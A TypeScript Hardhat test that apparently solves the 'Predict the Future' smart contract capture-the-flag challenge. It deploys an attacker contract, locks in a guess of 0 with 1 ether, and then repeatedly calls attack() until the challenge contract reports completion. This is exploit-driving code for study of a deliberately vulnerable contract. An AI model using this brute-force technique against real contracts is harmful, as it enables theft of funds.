import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
import { formatEtherscanTx } from "../utils/format";
import { sleep } from "../utils/promise";

let accounts: Signer[];
let eoa: Signer;
let contract: Contract; // challenge contract
let attacker: Contract;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const challengeFactory = await ethers.getContractFactory("PredictTheFutureChallenge");
  contract = challengeFactory.attach(`0x7D6dcd6Cad6c081095663C063439Fec38089a5A2`);

  const attackerFactory = await ethers.getContractFactory("PredictTheFutureAttacker");
  attacker = await attackerFactory.deploy(contract.address, {});
  // attacker = await attackerFactory.attach(`0xe086d8e96736950b1b125efb895943393c662248`)
});

it("solves the challenge", async function () {
  // guess a 0 and then brute force
  await attacker.lockInGuess(0, {
    value: ethers.utils.parseEther(`1`),
  });

  while(!await contract.isComplete()) {
    try {
      const tx = await attacker.attack({
        gasLimit: 1e5,
      });
      const txHash = tx && tx.hash;
      console.log(formatEtherscanTx(txHash));
    } catch (error) {
      console.log(`attack failed with ${error.message}`)
    }
    await sleep(1e4)
  }

  const isComplete = await contract.isComplete()
  expect(isComplete).to.be.true;
});
